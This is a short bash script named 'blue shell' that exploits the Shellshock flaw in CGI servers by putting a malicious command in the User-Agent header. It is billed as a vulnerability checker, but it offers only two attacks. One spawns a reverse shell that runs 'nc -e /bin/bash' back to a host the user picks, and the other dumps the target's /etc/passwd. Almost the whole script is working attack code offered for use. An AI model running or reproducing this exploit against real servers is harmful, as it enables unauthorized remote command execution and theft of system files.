#!/bin/bash
echo " _     _                  _          _ _ "
echo "| |__ | |_   _  ___   ___| |__   ___| | |"
echo "| '_ \| | | | |/ _ \ / __| '_ \ / _ \ | |"
echo "| |_) | | |_| |  __/ \__ \ | | |  __/ | |"
echo "|_.__/|_|\__,_|\___| |___/_| |_|\___|_|_|"                                        
echo ""
echo "Author: Pr0ton"
echo ""
echo "This tool checks whether a server is vulnerable to a shellshock attack by changing the user-agent to a malicious command."
echo " "
echo "By using this tool you agree to take fully responsibility for your own actions."
echo "------------------------------------------------------------------------------------------------------------------------------ "

# Start program

echo "[+] Vulnerable server: (Example: 192.168.0.100)"
read website
echo " "

if [[ $(echo $website | cut -c1-7) != "http://" ]]
then
	website=http://$website
fi

echo "[+] Vulnerable path: (Example: /cgi-bin/status)"
read path

website=$website$path

echo " "

echo "[+] Testing $website"

if [[ $(curl -Is $website | cut -c10-12 | grep 200) == 200 ]]
then
	echo "[+] Host is online"
else
	echo "[+] Host appears to be offline"
	echo "[+] Do you still want to continue? (y/n)"

	read con

	if [[ $con != "y" && $con != "Y" ]]
	then
		exit
	fi
fi

echo " "
echo "[+] Reverse shell [1] or read /etc/passwd [2] ?"
read pick

if [[ $pick == 1 ]]
then
	echo "[+] Pick a host:"
	read lhost
	echo "[+] Pick a port:"
	read port
	echo " "
	echo "[+] Listener: $lhost"
	echo "[+] Port: $port"
	echo " "
	echo "[+] Use this command before hitting enter on your machine: nc -vlp $port"
	read a
	echo "[+] Spawning a shell"
	curl -A "() { :;}; /bin/bash -c 'nc $lhost $port -e /bin/bash -i' " $website 
	clear
else
	echo " "
	echo "[+] Reading /etc/passwd...:"
	echo " "
	curl -A '() { :;};  echo; /bin/cat /etc/passwd' $website
fi
